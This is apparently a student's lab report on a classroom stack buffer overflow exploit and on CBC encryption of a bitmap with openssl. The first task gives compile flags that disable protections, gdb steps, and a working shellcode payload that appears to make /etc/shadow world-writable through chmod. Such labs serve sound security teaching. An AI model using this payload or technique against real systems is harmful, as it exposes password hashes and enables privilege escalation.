# Lab #1,22110018, Nguyen Hai Duong, INSE330380E_03FIE
# Task 1: Software buffer overflow attack

**Question 1**: 
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**:
## 1. Compile both C programs and shellcode to executable code:
*First, Open your Docker terminal and ensure I'm in the correct directory where the vuln.c file is located:*<br>
 Compile the vuln.c program using the following command
 Compile the Shellcode
 <img width="857" alt="{2C65AF27-B47D-428E-99DA-B1C58B7A72AB}" src="https://github.com/user-attachments/assets/9465ef25-462a-49f4-b715-fd3e82d8e2ce">

```sh
"gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2"
"gcc shellcode.c -o shell.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2"

```


## 2. Conduct the attack so that when C executable code runs, shellcode willc also be triggered:
-Prepare the Payload: firt, obtain the address of the buffer in vuln.out.
<img width="833" alt="{635A2EB6-6C32-4F24-A400-10E7D66A95F8}" src="https://github.com/user-attachments/assets/6f4045c9-9ce1-4b84-97b1-0219986a7389">
```sh
gdb vuln.out
```
-Use disassemble main to find the address of buffer
```sh
disassemble main
```
<img width="848" alt="{F1828BA9-70A9-4B61-A347-4A4E29AB3C9F}" src="https://github.com/user-attachments/assets/a054a436-e0ea-4734-91c6-77581a94d80e">
-Set break point after strcpy instruction

```sh
break *0x0804841e
```
<img width="229" alt="{2022D87A-8DB7-45A7-B781-8A92138F73EB}" src="https://github.com/user-attachments/assets/38287b79-ec78-45c4-88e9-019f384d4205">
- Run program in gdb with injecting argument:
<img width="1278" alt="{C7C3C600-59E9-46F4-933A-42087488FDDF}" src="https://github.com/user-attachments/assets/c714d09d-cca2-475d-9ad7-9d1df45199db">

```sh
 run $(python -c "print('A' * 16 + '\x89\xc3\x31\xd8\x50\xbe\x3e\x1f\x3a\x56\x81\xc6\x23\x45\x35\x21\x89\x74\x24\xfc\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe3\x66\x68\xff\x01\x66\x59\xb0\x0f\xcd\x80' + '\xff\xff\xff\xff')")
```
-Watch the stack memory from esp:
<img width="545" alt="{553B1E8A-C1C3-49C9-A525-2825AE4123E1}" src="https://github.com/user-attachments/assets/9e2b4698-fc2e-45d5-a909-e9252748d9da">

```sh
 x/80xb $esp
```
-Identify the return address while watching out the stack

```sh
set *0xffffd728 = 0xffffd720
```
<img width="286" alt="{801D97E9-2100-4670-BBFC-99D25D4A5520}" src="https://github.com/user-attachments/assets/0d1e661e-8c8b-429b-a1ca-1c3e8cd95682">
- Continue executing program
<img width="1280" alt="{18B5C310-39E5-4EFE-BED1-9484F8B8A06A}" src="https://github.com/user-attachments/assets/6dccd6ec-cf99-45cb-9cdb-a108c7127a19">
-return to gdb
<img width="214" alt="{22246C12-EC01-48C5-AE63-6DE224DD040C}" src="https://github.com/user-attachments/assets/a1de13a2-95f8-4e84-9514-163aff8d9244">



# Task 2. Encryption Mode – ECB vs. CBC
This lab compares the behaviour of ECB and CBC encryption modes
**Question 1**: Exploration of various ECB & CBC  with openssl
**Answer 1**:
## 1. Download the bitmap file `origin.bmp`.


## 2. Split the file into header and body:

```sh
dd if=origin.bmp of=header.bin bs=1 count=54
dd if=origin.bmp of=body.bin bs=1 skip=54
```

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage7.png?raw=true"><br>


## 3. Encrypt the body using CBC mode:

<span>*I reused the KEY and IV values from the first task, just to make sure the consistency.*</span><br>

```sh
openssl enc -aes-256-cbc -nosalt -in body.bin -out encrypted_body.bin -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
```

<span>*After using the `cat` command to look at the `encrypted_body.bin`, we can see it was fully encrypted.*</span><br>

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage8.png?raw=true"><br>

## 4. Combine the header and encrypted body:

```sh
cat header.bin encrypted_body.bin > partially_encrypted.bmp
```

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage9.png?raw=true"><br>
